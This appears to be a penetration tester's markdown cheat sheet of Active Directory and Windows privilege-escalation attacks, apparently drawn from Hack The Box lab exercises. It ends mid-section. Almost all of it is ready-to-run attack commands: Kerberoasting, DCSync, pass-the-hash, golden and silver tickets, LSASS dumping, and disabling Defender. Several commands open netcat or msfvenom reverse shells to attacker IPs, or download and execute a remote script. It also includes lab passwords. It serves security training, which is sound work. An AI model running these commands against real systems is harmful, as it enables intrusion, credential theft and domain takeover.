# Windows
### Active Directory ACL`s with Powerview

```

PS C:\htb> Import-Module .\PowerView.ps1
PS>Find-InterestingDomainAcl

```

```
-- Name to sid
PS C:\htb> $sid = Convert-NameToSid wley
```
```
-- find all domain objects that our user has rights over
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}


--find the rights a group may have

PS C:\htb> $itgroupsid = Convert-NameToSid "Information Technology"

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose

```
```
---map the right name back to the GUID value

 PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529"
    
    PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
    
```

```
--Resolve guid with PowerView

PS C:\htb> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} 
```

```
--Creating a List of Domain Users With PowerView

PS C:\htb> Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```

```
-- retrieve ACL information for each domain user

PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
```
--Changing the User's Password (GenericAll - AllExtendedRights)

PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
```
-- Add an AD Users To a Group  (GenericAll -AllExtendedRights)

PS C:\htb> Add-DomainGroupMember -Identity {AD GREOPU NAME} -Members {USER NAME} -Credential $Cred2 -Verbose

THEN REMOVE IT
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```
```
--Assigning an SPN to a user (GenericWrite)

 PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose


THEN REMOVE IT
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```
### SharpView Enumeration
```
- Enum Domain User
PS C:\htb> .\SharpView.exe Get-DomainUser -Identity forend
```
### PowerView Enumeration

```
-- Domain User Information

PS C:\htb> Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
```

```
--Get members of an AD group

PS C:\htb> Get-DomainGroup -Identity {AD GROUP NAME} | select memberof
```

```
Remote Machine User Groups

--Enumerating the Remote Desktop Users Group

PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"

--  Search for passwords in Users description

PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

--Enumerating the Remote Management Users Group

PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

! Custom Bloodhound query for the same task

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p21


--Testing for Local Admin Access

PS C:\htb> Test-AdminAccess -ComputerName ACADEMY-EA-MS01


```
```
--View User`s Group Membership

 PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl

--Enumerating GPO Names with PowerView

PS C:\htb> Get-DomainGPO |select displayname

```
```
--Check users Replication Rights
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"

PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```
```
--Checking for Reversible Encryption Option using Powerview

PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```
```
-- Find Unconstrained Computers

PS> Get-DomainComputer -Unconstrained 
```
```
-- Find Constrained Delegation Computers

PS > Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto,useraccountcontrol -Verbose | fl 

Gain acces to that computer then execute this

PS > .\Rubeus.exe dump
 
```


```
        Command 	Description
Export-PowerViewCSV 	Append results to a CSV file
ConvertTo-SID 	        Convert a User or group name to its SID value
Get-DomainSPNTicket 	Requests the Kerberos ticket for a specified Service Principal Name (SPN) account
Domain/LDAP Functions: 	
Get-Domain 	        Will return the AD object for the current (or specified) domain
Get-DomainController 	Return a list of the Domain Controllers for the specified domain
Get-DomainUser 	        Will return all users or specific user objects in AD
Get-DomainComputer 	Will return all computers or specific computer objects in AD
Get-DomainGroup 	Will return all groups or specific group objects in AD
Get-DomainOU 	        Search for all or specific OU objects in AD
Find-InterestingDomainAcl 	Finds object ACLs in the domain with modification rights set to non-built in objects
Get-DomainGroupMember 	Will return the members of a specific domain group
Get-DomainFileServer 	Returns a list of servers likely functioning as file servers
Get-DomainDFSShare 	Returns a list of all distributed file systems for the current (or specified) domain
GPO Functions: 	
Get-DomainGPO 	        Will return all GPOs or specific GPO objects in AD
Get-DomainPolicy 	Returns the default domain policy or the domain controller policy for the current domain
Computer Enumeration Functions: 	
Get-NetLocalGroup 	Enumerates local groups on the local or a remote machine
Get-NetLocalGroupMember 	Enumerates members of a specific local group
Get-NetShare 	        Returns open shares on the local (or a remote) machine
Get-NetSession 	        Will return session information for the local (or a remote) machine
Test-AdminAccess 	Tests if the current user has administrative access to the local (or a remote) machine
Threaded 'Meta'-Functions: 	
Find-DomainUserLocation 	Finds machines where specific users are logged in
Find-DomainShare 	Finds reachable shares on domain machines
Find-InterestingDomainShareFile 	Searches for files matching specific criteria on readable shares in the domain
Find-LocalAdminAccess 	Find machines on the local domain where the current user has local administrator access
Domain Trust Functions: 	
Get-DomainTrust 	Returns domain trusts for the current domain or a specified domain
Get-ForestTrust 	Returns all forest trusts for the current forest or a specified forest
Get-DomainForeignUser 	Enumerates users who are in groups outside of the user's domain
Get-DomainForeignGroupMember 	Enumerates groups with users outside of the group's domain and returns each foreign member
Get-DomainTrustMapping 	Will enumerate all trusts for the current domain and any others seen.
```

### ADRecon Enumeration

```
PS C:\htb> .\ADRecon.ps1
```

### Establish a null session from windows

```
C:\htb> net use \\DC01\ipc$ "" /u:""
```

### Powershell Useful
```
            #### Builtin AD ENUM
PS C:\htb> Import-Module ActiveDirectory

-Get Domain Info
PS C:\htb> Get-ADDomain

-Get-ADUser
PS C:\htb> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

-Group Enumeration
PS C:\htb> Get-ADGroup -Filter * | select name

-Group Membership
PS C:\htb> Get-ADGroupMember -Identity "Backup Operators"

- Checking For Trust Relationships
Get-ADTrust -Filter *
```
```
Creating a SecureString Object

PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
```
```
---Creating a PSCredential Object
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword) 
```

```
--Establishing WinRM Session from Windows

PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force

PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred

!OR

PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess


```
```
-available modules loaded for use
PS >Get-Module 

-Print Exec Policy
PS >Get-ExecutionPolicy -List

-Fix Execution Policy
PS >Set-ExecutionPolicy Bypass -Scope Process 

-Print Powershell history (specific User)
PS > Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 

- Print Env variables
PS > Get-ChildItem Env: | ft Key,Value 

```
```
- Downgrade Powershell
        PS C:\htb> Get-host

        PS C:\htb> powershell.exe -version 2

        PS C:\htb> Get-host

        PS C:\htb> get-module
```
```
-Other Logged in Users
PS C:\htb> qwinsta
```
```
-- RDP DisableRestrictedAdminMode  

C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
-Enable colorfull output in powershell and cmd

REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```
### Checking Defenses

```
- Firewall
  PS C:\htb> netsh advfirewall show allprofiles
  PS C:\htb> netsh advfirewall show state


- Windows Defender
    PS C:\htb> Get-MpComputerStatus

-Try to disable it

PS > Set-MpPreference -DisableRealtimeMonitoring $true

-Enumerate Applocker

PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```
```
--PowerShell Constrained Language Mode

 PS C:\htb> $ExecutionContext.SessionState.LanguageMode



```
```
---LAPS

PS C:\htb> Find-LAPSDelegatedGroups

PS C:\htb> Find-AdmPwdExtendedRights

PS C:\htb> Get-LAPSComputers

```
### Group3r 
```
Group3r must be run from a domain-joined host with a domain user

C:\htb> group3r.exe -f <filepath-name.log>

```
### Enumerating MSSQL Instances with PowerUpSQL

```
- Bloodhound query for SQLADMINS

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

```


```


PS C:\htb> cd .\PowerUpSQL\

PS C:\htb>  Import-Module .\PowerUpSQL.ps1

PS C:\htb>  Get-SQLInstanceDomain

```
```
- authenticate to the  SQL server

PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

```
### Kerberoast
```
--Finding Users With SPN Set (PowerView)

PS C:\htb> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

-Enumerating SPNs with setspn.exe

 C:\htb> setspn.exe -Q */*



```

```
#With Rebeus
 PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
 ```
 -targeting a single user with System.IdentityModel
 
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
        
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

-Using the /tgtdeleg Flag to delegate encryption

PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn

!! Doesnt work in WindowsServer 2019
```

```
-Retrieving All Tickets Using setspn.exe

PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

```

```
-Extracting Tickets from Memory with Mimikatz

mimikatz # base64 /out:true

mimikatz # kerberos::list /export 


$ echo "<base64 blob>" |  tr -d \\n 
$ cat encoded_file | base64 -d > sqldev.kirbi
$ python2.7 kirbi2john.py sqldev.kirbi
$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

```
```
-- Using PowerView

 PS C:\htb> Get-DomainUser * -spn | select samaccountname
 
 PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

-Exporting All Tickets to a CSV File

PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation


-Checking Supported Encryption Types

PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

```

```

- Invoke-Kerberoast.ps1

 PS C:\Temp > IEX(new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1");Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hash.kerberoast
```
### AS-REPRoasting

```
-With PowerView

PS>  Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose


PS>  Import-Module .\ASREPRoast.ps1

PS> Get-ASRepHash -Domain m0chanAD.local -UserName m0chan

PS> hashcat64.exe -a 0 -m 7500 asrep.hash /wordlists/rockyou.txt
```
```
-With Rebeus
PS >  .\Rubeus asrep /format:hashcat

-ASREP All Users in a Specific OU
PS > .\Rubeus asrep /ou:OU=SerivceAcc,DC=m0chanAD,DC=local /format:hashcat /outfile:C:\Temp\Hashes.txt

-Roasting a Specific Users

PS > .\Rubeus asrep /user:mssqlservice /format:hashcat
```
### Password Spraying

```
-Enumerating Null Session

C:\htb> net use \\DC01\ipc$ "" /u:""

C:\htb> net use \\DC01\ipc$ "" /u:guest
```
```
- Using PowerView

PS C:\htb> Get-DomainPolicy
```
```
- using net binary

C:\htb> net accounts
```
```
-Using DomainPasswordSpray.ps1

PS C:\htb> Import-Module .\DomainPasswordSpray.ps1

PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

### Kerberos Bruteforcing

```
PS > .\Rubeus.exe brute /users:usernames.txt /passwords:pass.txt /domain:m0chanAd.local /outfile:brutepasswords.txt
```

### DCSync

```
--Performing the Attack with Mimikatz

 mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
 ```


```
- Creating Shadow Copy of C:

*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

```


### Pass The Hash

```
- With Mimikatz

c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

```
```
-Using Invoke-TheHash

PS c:\htb> cd C:\tools\Invoke-TheHash\
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose

```
### Silver Ticket

```
mimikatz “kerberos::golden /admin:LukeSkywalker /id:1106 /domain:lab.adsecurity.org /sid:{Domain SID} /target:adsmswin2k8r2.lab.adsecurity.org /rc4:{target ntlm hash} /service:cifs /ptt” exit
```

```
-- Inject the ticket with Rebeus

PS > .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

PS > .\Rubeus.exe ptt /ticket:BASE64BLOBHERE
```
### Godlen Tickets

```
- With Mimikatz

mimikatz.exe 
kerberos::golden /domain:m0chanAD.local /sid:<domain-sid> /krbtgt:<krbtgt nt hash> /id:500 /user:FakeAdmin /ticket persistance4life.kirbi
```
### Enumerating Trust Relationships
```
--Using Get-ADTrust (bultin)

PS C:\htb> Import-Module activedirectory

PS C:\htb> Get-ADTrust -Filter *
```
```
--Using Get-DomainTrustMapping
PS C:\htb> Get-DomainTrustMapping
```
```
--Using netdom to query domain trust
 C:\htb> netdom query /domain:inlanefreight.local trust
 ```
```
--Using netdom to query domain controllers

C:\htb> netdom query /domain:inlanefreight.local dc
```
### SIDHistory
```
--Obtaining the KRBTGT Account's NT Hash using Mimikatz

  PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

--Using Get-DomainSID (PowerView)

  PS C:\htb> Get-DomainSID
```
### Golden Ticket
```
-- Golden Ticket with Mimikatz
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:{child domain(compromised) sid} /krbtgt:9d765b482771505cbe97411065964d5f /sids:{Enterprise Admins sid} /ptt
```

```
--Confirming a Kerberos Ticket is in Memory 
PS C:\htb> klist
```
```
--Golden Ticket using Rubeus
PS C:\htb>  .\Rubeus.exe golden /rc4:{krbtgt nt hash} /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
### LLMNR/NBT-NS Poisoning

```
- Using Powershell Inveigh.ps1

PS C:\htb> Import-Module .\Inveigh.ps1

PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
PS C:\htb> .\Inveigh.exe
```

### Enumerating for MS-PRN Printer Bug

```
PS> Import-Module .\SecurityAssessment.ps1

PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
### Enum shares with Snaffler
```
PS C:\Tools>Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data

```
### Sharphound

```
PS C:\htb> .\SharpHound.exe -c All --zipfilename ILFREIGHT
```

### MySQL

```
- Connect
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
```
### CMD

- Basic Enumeration Commands
```
- Prints the PC's Name
>hostname

-Patches and Hotfixes
>wmic qfe get Caption,Description,HotFixID,InstalledOn

-Find Domain Name
>set %USERDOMAIN% 

-Find Domain Controller
>set %logonserver%

```
```
-Check Windows Defender

C:\htb> sc query windefend
```

- net commands
```
-Information about password requirements
>net accounts 	                         

-Password and lockout policy
>net accounts /domain 	                        

-Information about domain groups
>net group /domain 	                        

-List users with domain admin privileges
>net group "Domain Admins" /domain 	        

-List of PCs connected to the domain
>net group "domain computers" /domain 	        


-List PC accounts of domains controllers
>net group "Domain Controllers" /domain  	

-User that belongs to the group
>net group <domain_group_name> /domain 	        


-List of domain groups
>net groups /domain 	                        

-All available groups
>net localgroup 	

-List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
>net localgroup administrators /domain 	        


-Information about a group (admins)
>net localgroup Administrators 	                

-Add user to administrators
>net localgroup administrators [username] /add 	

-Check current shares
>net share 	 


-Get information about a user within the domain
>net user <ACCOUNT_NAME> /domain 	        

-List all users of the domain
>net user /domain 	                        

-Information about the current user
>net user %username% 	                        

-Mount the share locally
>net use x: \computer\share 	                

-Get a list of computers
>net view 	  


-Shares on the domains
>net view /all /domain[:domainname] 	        

-List shares of a computer
>net view \computer /ALL 	   

 - List of PCs of the domain
>net view /domain 	                      
```
### Ping sweep
```
- CMD

for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

- Powershell

1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"} |Select-String ttl

```
### System Enum

```
C:\htb> systeminfo

-Display HotFixes

C:\htb> wmic qfe

PS C:\htb> Get-HotFix | ft -AutoSize

-Installed Programs

C:\htb> wmic product get name

PS C:\htb> Get-WmiObject -Class Win32_Product |  select Name, Version

-Display Running Processes

PS C:\htb> netstat -ano

-Logged-In Users

C:\htb> query user

-Get All Groups

C:\htb> net localgroup


 -Named Pipes
 
 C:\htb> pipelist.exe /accepteula
 
PS C:\htb>  gci \\.\pipe\

-enumerate the permissions assigned to named pipe

C:\htb> accesschk.exe /accepteula \\.\Pipe\lsass -v


```

```
-Checking Windows Version

PS C:\htb> [environment]::OSVersion.Version

-Reviewing Path Variable

PS C:\htb> cmd /c echo %PATH%
```
### Weak Permissions

```
--Permissive File System ACLs

PS C:\htb> .\SharpUp.exe audit

--Permissice access to services

PS C:\tools> accesschk.exe -uwcqv "Authenticated Users" * /accepteula

-Checking ACL's  in file system with icacls

PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

-Checking Permissions with AccessChk

C:\htb> accesschk.exe /accepteula -quvcw WindscribeService

-Changing the Service Binary Path

C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

--Searching for Unquoted Service Paths

C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

--Check Startup Programs

PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

-Enumerating Running Service

PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}

```

###  Unquoted Service Paths

```
PS C:\> wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

PS C:\> wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
```
### Permissive Registry ACLs

```
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services

--Changing ImagePath with PowerShell

C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\{ServiceName} -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"

- OR in cmd.exe

C:\tools> reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f


```


### Modifiable Registry Autorun Binary

```
PS C:\htb> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl

```

### SeImpersonate and SeAssignPrimaryToken
```
$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth

SQL> enable_xp_cmdshell

SQL> xp_cmdshell whoami /priv

- JuicyPotato
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t 

--PrintSpoofer and RoguePotato

SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.15.91 4040 -e cmd"

--metasploit 

use exploit/windows/local/ms16_075_reflection_juicy
```
### SEDebugPrivilege

```

C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

C:\htb> mimikatz.exe

mimikatz # log

mimikatz # sekurlsa::minidump lsass.dmp

mimikatz # sekurlsa::logonpasswords
```

### SeBackupPrivilege

```
- You can login to DC and get ntds.dit

PS C:\htb> Set-SeBackupPrivilege

PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll

PS C:\htb> diskshadow.exe

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit


PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit

```
### From Administrator to SYSTEM

```
C:\htb> psexec -i -s cmd.exe

```


### UAC

```
-Confirming UAC is Enabled

C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

-Checking UAC Level

C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```
### Credential Hunting
```
PS C:\htb> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

-Chrome Dictionary Files

PS C:\htb> gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

-PowerShell History File

C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\htb> foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

-Confirming PowerShell History Save Path

PS C:\htb> (Get-PSReadLineOption).HistorySavePath
```

```
--Sticky Notes Passwords

PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process

PS C:\htb> cd .\PSSQLite\

PS C:\htb> Import-Module .\PSSQLite.psd1

PS C:\htb> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

PS C:\htb> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```
```
--Cmdkey Saved Credentials

C:\htb> cmdkey /list

```
```
--Browser Credentials

PS C:\htb> .\SharpChrome.exe logins /unprotect

```

```
- LaZagne

PS C:\htb> .\lazagne.exe all

```

```
-Putty

PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

```
- AlwaysInstallElevated 

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated


-- Generating msi payload

$ msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi


- Executing in cmd.exe

C:\htb> msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

```
--Finding credentials in registry

REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d

```

# Linux 



### AD Enumeration

```
--CME - Domain User Enumeration

$ sudo crackmapexec smb 172.16.5.5 -u {username} -p {password} --users

--CME -Domain Groups

$ sudo crackmapexec smb 172.16.5.5 -u {username} -p {password} --groups

```

```
--Enumerating Shares

$ sudo crackmapexec smb 172.16.5.5 -u {username} -p {password} --shares

--dig through each readable share

$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

```

- SMBMap

```
- SMBMap To Check Access

$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

- RPCClient

```
- NULL sessions

$ rpcclient -U "" -N 172.16.5.5
``` 
```
-  User Enumeration By RID

rpcclient $> queryuser 0x457
```
```
- enumerate all users
    
rpcclient $> enumdomusers

```
- PSExec.py
```
- We Need a set of admin credentials

$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```
- WmiExec.py
```
 $ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
 ```
- windapsearch

```
-Find Domain Admins

$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```
```
-Find Privileged Users

$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

### DCSync

- CrackMapExec
```
--Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
```

```

$ crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds

```
### Kerberoasting
```
-Find users with spn`s set
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/{user}

```
```
-Requesting all TGS Tickets
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/{user} -request
```
```
-Requesting a Single TGS ticket
$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
```
-Cracking the Ticket Offline with Hashcat
$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
### AS-REPRoasting

```
$ python GetNPUsers.py m0chanAD/ -usersfile TargetUsers.txt -format hashcat -outputfile hashes.asreproast


```
### Kerberos Bruteforcing

```
$ python kerbrute.py -domain m0chanAD.local -users usernames.txt -passwords pass.txt -outputfile foundusers.txt
```

### Responder

```
$ sudo responder -I {iface} -A 
```

### fping
```
$ fping -asgq 172.16.5.0/23
-q not to show per target results
-a alive targets
-s shows stats
-g generate a list of the cidr notation
```

### Kerbrute
```
$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
```

### Silver Ticket

```
- Using ticketer.py

$  python ticketer.py -domain-sid S-1-5-21-1473643419-774954089-2222323452 -nthash d7e2b80507ea074ad59f152a1ba20458 -domain m0chanAD.local -spn cifs/workstation.m0chanAD.local m0chan

KRB5CCNAME=/scripts/m0chan.ccache (the above exported file)

```

### adidnsdump

```
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r 
```

### Password Spraying

```
-Enumerating the Password Policy CME

$ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

```

```
- Enum with rpcclient Null session

$ rpcclient -U "" -N 172.16.5.5

    rpcclient $> querydominfo

    rpcclient $> getdompwinfo
```

```
- Enumerate with enum4linux

$ enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

```
-LDAP Anonymous Bind

$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

```
```
-Password Spraying with rpcclient

